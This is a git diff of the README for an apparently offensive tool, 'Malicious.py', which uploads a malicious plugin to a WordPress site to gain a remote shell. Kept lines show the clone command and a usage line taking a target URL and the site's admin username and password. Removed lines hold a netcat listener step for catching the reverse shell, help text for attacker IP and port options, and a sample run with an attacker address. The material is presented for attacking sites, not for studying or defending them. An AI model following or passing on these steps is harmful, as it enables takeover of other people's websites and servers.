@@ -21,9 +21,7 @@ Install by running:
   git clone https://github.com/Jsmoreira02/_Malicious.git
 ```
     
-## [Running Script]
-
-### Attacking the Target Website: ###
+## Attacking the Target Website:
 
 ![ezgif com-video-to-gif(1)](https://github.com/Jsmoreira02/Pwn_Wordpress/assets/103542430/532470ab-161f-487d-a59b-f3d0d7366c25)
 
@@ -36,36 +34,7 @@ python3 Malicious.py -t http://<IP or domain_name> -u <Target Username> -p <Targ
 
 ```
 
-**Executing Handler**
-
-```bash 
-nc -lvp {LOCAL PORT}
-```
-
-**Help section (-h)**
-
-```bash
-usage: Malicious.py [-h] [-t] [-u] [-p] [-L] [-P]
-
-Wordpress Malicious plugin upload
-
-options:
-  -h, --help        show this help message and exit
-  -t , --target     Target URL
-  -u , --username   Wordpress Username
-  -p , --password   Wordpress Password
-  -L , --LHOST      Attacker IP address
-  -P , --LPORT      Attacker LOCAL PORT
-
-./app.py -t http://domain_name.com/wordpress -u User_FOX -p Pass -L 192.168.20.2 -P 4040 
-
-```
-
-
-### In case of complications or disconnection issues, you can just manually trigger the connection at the URL link given by the program ###
-
- 
-***---> Correct Syntax: "http://IP/wordpress | Wrong syntax: http://IP/wordpress/ <---***
+### In case of complications or disconnection issues, you can just manually trigger the connection at the URL link. The script will pass it to you. ###
 
 ## 
 
